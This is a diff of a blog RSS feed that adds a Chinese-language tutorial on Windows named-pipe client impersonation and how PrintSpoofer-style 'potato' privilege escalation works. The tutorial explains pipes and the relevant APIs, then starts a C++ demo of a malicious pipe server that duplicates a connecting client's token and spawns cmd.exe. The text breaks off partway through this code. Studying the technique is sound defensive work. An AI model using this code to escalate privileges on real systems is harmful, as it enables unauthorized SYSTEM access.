@@ -5,9 +5,578 @@
     <description> &lt;h1&gt;P001water@c:\Users\maylas\.ssh&lt;/h1&gt; &lt;h3&gt;Do Enjoy youself in hack life&lt;/h3&gt; --------CMD /c 这里是朴水... ... Reply from 1988 !-------</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Wed, 12 Jul 2023 16:39:30 +0800</pubDate>
-    <lastBuildDate>Wed, 12 Jul 2023 16:39:30 +0800</lastBuildDate>
+    <pubDate>Wed, 26 Jul 2023 16:02:13 +0800</pubDate>
+    <lastBuildDate>Wed, 26 Jul 2023 16:02:13 +0800</lastBuildDate>
     <generator>Jekyll v4.3.2</generator>
+    
+      <item>
+        <title>Windows命名管道客户端模拟和PrintSpoofer原理探究</title>
+        <description>&lt;blockquote&gt;
+  &lt;p&gt;文章首发于&lt;a href=&quot;https://paper.seebug.org/2090/&quot;&gt;Windows 命名管道客户端模拟和 PrintSpoofer 原理探究 (seebug.org)&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h1 id=&quot;前言&quot;&gt;前言&lt;/h1&gt;
+
+&lt;p&gt;在Windows的实际渗透中，提权方面我们最常用到的就是众多的土豆家族&lt;/p&gt;
+
+&lt;p&gt;关于各种土豆的原理，似乎很多人印象中一直都是这样：利用COM interface的某些特性，诱骗具有System权限的帐户连接我们可控的RPC服务端进行身份验证，然后NTLM relay的过程，拿到System的权限。&lt;/p&gt;
+
+&lt;p&gt;现实是，基于这种想法利用的potatoes在win10 1089和server 2019之后基本都已失效了，现在正火热的RoguePotato (NG)，Sweetpotato(集成了Printspoofer等)，BadPotato，GodPotato等，都是结合了命名管道客户端模拟的老技术&lt;/p&gt;
+
+&lt;p&gt;命名管道客户端模拟（Named_Pipe_Client_Impersonation）可以说是中后期土豆家族的关键之处，由于微软官方认为从具有SeImpersonate privilege特权的Windows服务账户提升至 NT AUTHORITY/SYSTEM 权限是预期行为。所以此后的很长一段时间，基于命名管道客户端模拟的potato都能成为利器。&lt;/p&gt;
+
+&lt;p&gt;本文就通过命名管道客户端模拟（Name_pipe_client_Impersonation）的学习，初窥正活跃的potatoes家族中的成员，探究&lt;/p&gt;
+
+&lt;p&gt;PrintSpoofer、BadPotato、pipePotato等”当代土豆”的原理，便于实际场景中更好的选择合适的土豆。&lt;/p&gt;
+
+&lt;h1 id=&quot;正文&quot;&gt;正文&lt;/h1&gt;
+
+&lt;h2 id=&quot;管道&quot;&gt;管道&lt;/h2&gt;
+
+&lt;p&gt;讲命名管道之前先来讲下管道。管道并不是什么新鲜事物，它是一项成熟的技术，可以在很多操作系统（Unix、Linux、Windows 等）中找到，其本质是是用于进程间通信的&lt;strong&gt;共享内存区域&lt;/strong&gt;，确切的说应该是&lt;strong&gt;线程&lt;/strong&gt;间的&lt;strong&gt;通信方法&lt;/strong&gt;（IPC）。&lt;/p&gt;
+
+&lt;p&gt;在 Windows 系统中，存在两种类型的管道：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;匿名管道 (Anonymous pipes)：匿名管道是基于字符和半双工的（即单向），通常在父进程和子进程之间传输数据，只能本地使用&lt;/li&gt;
+  &lt;li&gt;命名管道 (Named pipes)：命名管道则强大的多，它是面向消息和全双工（单向或双向）的，同时还允许网络通信，用于创建客户端/服务器系统。可通过名称引用；支持多客户端连接；支持双向通信；支持异步重叠 I/O&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;由于匿名管道单向通信，且只能在本地使用的特性，一般用于程序输入输出的重定向，如一些后门程序获取 cmd 内容等等，在实际攻击过程中利用不多，因此就不过多展开讨论。本文的主要内容还是命名管道Named Pipes。&lt;/p&gt;
+
+&lt;h2 id=&quot;命名管道-names-pipes&quot;&gt;命名管道 Names Pipes&lt;/h2&gt;
+
+&lt;p&gt;不仅仅是土豆家族的本地提权，内网横向三大件，都离不开命名管道&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;命名管道&lt;/strong&gt;是一个具有名称，可在同一台计算机的不同进程之间或在跨越一个网络的不同计算机的不同进程之间，支持&lt;strong&gt;可靠的&lt;/strong&gt;、&lt;strong&gt;单向或双向&lt;/strong&gt;的数据通信管道。命名管道的所有实例拥有&lt;strong&gt;相同的名称&lt;/strong&gt;，但是每个实例都有其自己的缓冲区和句柄，用来为不同客户端提供独立的管道。任何进程都可以访问命名管道，并接受安全权限的检查，通过命名管道使相关的或不相关的进程之间的通讯变得异常简单。&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  用命名管道来设计跨计算机应用程序实际非常简单，并不需要事先深入掌握底层网络传送协议（如TCP、UDP、IP、IPX）的知识。这是由于命名管道利用了微软网络提供者（MSNP）重定向器通过同一个网络在各进程间建立通信，这样一来，应用程序便不必关心网络协议的细节。
+
+ 任何进程都可以成为服务端和客户端双重角色，这使得点对点双向通讯成为可能。在这里，管道服务端进程指的是创建命名管道的一端，而管道客户端指的是连接到命名管道某个实例的一端。
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;总结：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;命名管道的名称在本系统中是唯一的。&lt;/li&gt;
+  &lt;li&gt;命名管道可以被任意符合权限要求的进程访问。&lt;/li&gt;
+  &lt;li&gt;命名管道只能在本地创建。&lt;/li&gt;
+  &lt;li&gt;命名管道是双向的，所以两个进程可以通过同一管道进行交互。&lt;/li&gt;
+  &lt;li&gt;多个独立的管道实例可以用一个名称来命名。例如几个客户端可以使用名称相同的管道与同一个服务器进行并发通信。&lt;/li&gt;
+  &lt;li&gt;命名管道的客户端可以是本地进程（本地访问：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\\.\pipe\PipeName&lt;/code&gt;）或者是远程进程（访问远程： &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\\ServerName\pipe\PipeName&lt;/code&gt;）。&lt;/li&gt;
+  &lt;li&gt;命名管道使用比匿名管道灵活，服务端、客户端可以是任意进程，匿名管道一般情况下用于父子进程通讯。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;它与网络编程中的TCP套接字编程非常相似，都有服务端和客户端的概念，你可以拥有一个服务端监听连接，等待客户端连接到服务端以请求或发送数据的过程。&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;命名管道在Windows系统中被广泛使用，用MS的工具[Pipelist - Sysinternals&lt;/td&gt;
+      &lt;td&gt;Microsoft Learn](https://learn.microsoft.com/en-us/sysinternals/downloads/pipelist)，可以看到本机的命名管道及其相关信息：&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/image-20230623111054734.png&quot; alt=&quot;image-20230623111054734&quot; style=&quot;zoom: 67%;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;或者直接使用powershell命令&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Get-ChildItem&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\\.\pipe\&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-ChildItem&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\\.\pipe\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/image-20230623135542534.png&quot; alt=&quot;image-20230623135542534&quot; style=&quot;zoom: 67%;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;或者浏览器中file协议查看管道&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;file://.//pipe//
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/image-20230715225048804.png&quot; alt=&quot;image-20230715225048804&quot; style=&quot;zoom: 67%;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;命名管道的创建和操作是通过Windows API调用进行管理的。&lt;/p&gt;
+
+&lt;p&gt;对于服务端进程，常用的函数有&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateNamedPipe()&lt;/code&gt; 创建命名管道&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ConnectNamedPipe()&lt;/code&gt; 用于等待客户端连接&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;对于客户端进程，可用的函数有&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateFile()&lt;/code&gt;  连接到一个正在等待连接的命名管道上，成功返回后，客户进程就得到了一个指向已经建立连接的命名管道实例的句柄，到这里，服务端进程的 ConnectNamedPipe() 也就完成了其建立连接的任务。&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CallNamedPipe()&lt;/code&gt; 连接到一个消息类型的管道（如果管道的实例不可用则等待），向管道写入并从管道读取数据，然后关闭管道。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;我们获得了命名管道的句柄，就可以像读/写文件一样读取/写入数据。每个命名管道都由以下&lt;strong&gt;“PATH”&lt;/strong&gt;标识，命名管道的命名规范遵循通用命名规范（UNC）：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\\ServerName\pipe\PipeName
+访问本机上的管道
+\\.\pipe\PipeName或者\\localhost\pipe\PipeName
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;我们可以使用各种语言（如C、C#和PowerShell）来操作命名管道，因为归根结底还是对Windows api的调用。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;但是，为什么我们要关心命名管道呢？&lt;/strong&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;因为它允许服务端进程对连接到它的客户端进程进行&lt;strong&gt;模拟&lt;/strong&gt;。它涉及到一个至关重要的Windows api&lt;/p&gt;
+
+  &lt;p&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient&quot;&gt;ImpersonateNamedPipeClient()&lt;/a&gt;。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/image-20230625143246366.png&quot; alt=&quot;image-20230625143246366&quot; style=&quot;zoom:67%;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;通过调用ImpersonateNamedPipeClient()，命名管道服务端可以模拟命名管道客户端的安全上下文，&lt;strong&gt;从而直接将命名管道服务端当前线程的Token令牌更改为命名管道客户端的Token令牌&lt;/strong&gt;，关键就在这。&lt;/p&gt;
+
+&lt;p&gt;再看MSDN对它的附注，和所有模拟函数（包括ImpersonateNamedPipeClient）一样，它需要满足以下条件之一：&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;令牌的请求模拟级别低于SecurityImpersonation，例如SecurityIdentification或SecurityAnonymous。&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;调用者具有SeImpersonatePrivilege权限&lt;/strong&gt;。&lt;/li&gt;
+  &lt;li&gt;通过LogonUser或LsaLogonUser函数，一个进程（或调用者登录会话中的另一个进程）使用明确凭据创建了令牌。&lt;/li&gt;
+  &lt;li&gt;验证的身份与调用者相同。 Windows XP与SP1及更早版本：不支持SeImpersonatePrivilege权限。&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;这也是中后期土豆都需要SeImpersonatePrivilege权限的原因，需要这个特权才能成功调用至关重要的ImpersonateNamedPipeClient() api函数。&lt;/p&gt;
+
+&lt;p&gt;因此，如果我们自己创建一个恶意的命名管道服务端，并且一个具有管理员（甚至是System权限）权限的管道客户端连接到我们的管道服务端，理论上我们就可以模拟管理员用户的权限。&lt;/p&gt;
+
+&lt;h1 id=&quot;实现命名管道客户端模拟&quot;&gt;实现命名管道客户端模拟&lt;/h1&gt;
+
+&lt;p&gt;介绍几个会使用的Win API&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;GetCurrentProcess()  返回值是当前进程的伪句柄。&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;OpenProcessToken() 打开与进程关联的访问令牌（Access Token），返回访问令牌的句柄的指针&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;DuplicateToken() or DuplicateTokenEx() 创建一个新的访问令牌，该令牌复制已存在的&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/desktop/SecGloss/a-gly&quot;&gt;访问令牌&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;CreateProcessWithTokenW()  创建新进程及其主线程。新进程在&lt;strong&gt;指定&lt;/strong&gt;令牌的安全上下文中运行。&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;ImpersonateNamedPipeClient()&lt;/strong&gt; 参上详细介绍&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Demo代码实现如下&lt;/p&gt;
+
+&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;sddl.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ImpersonatedUser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dwCreationFlags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;dwCreationFlags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CREATE_UNICODE_ENVIRONMENT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;g_bInteractWithConsole&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TRUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;LPWSTR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwszCurrentDirectory&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;dwCreationFlags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;g_bInteractWithConsole&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CREATE_NEW_CONSOLE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;LPVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpEnvironment&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;PROCESS_INFORMATION&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;STARTUPINFO&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;si&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hSystemTokenDup&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;INVALID_HANDLE_VALUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;DuplicateTokenEx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TOKEN_ALL_ACCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecurityImpersonation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TokenPrimary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hSystemTokenDup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;CreateProcessWithTokenW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hSystemTokenDup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LOGON_WITH_PROFILE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;L&quot;cmd.exe&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dwCreationFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpEnvironment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwszCurrentDirectory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;si&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;wmain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;wchar_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;LPWSTR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwszPipeName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;TOKEN_GROUPS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;group_token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hPipe&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;INVALID_HANDLE_VALUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hToken&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;INVALID_HANDLE_VALUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;SECURITY_DESCRIPTOR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;SECURITY_ATTRIBUTES&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sa&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;InitializeSecurityDescriptor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SECURITY_DESCRIPTOR_REVISION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;ConvertStringSecurityDescriptorToSecurityDescriptorW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;L&quot;D:(A;OICI;GA;;;WD)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpSecurityDescriptor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;hPipe&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateNamedPipe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pwszPipeName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PIPE_ACCESS_DUPLEX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PIPE_TYPE_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PIPE_WAIT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2048&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2048&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
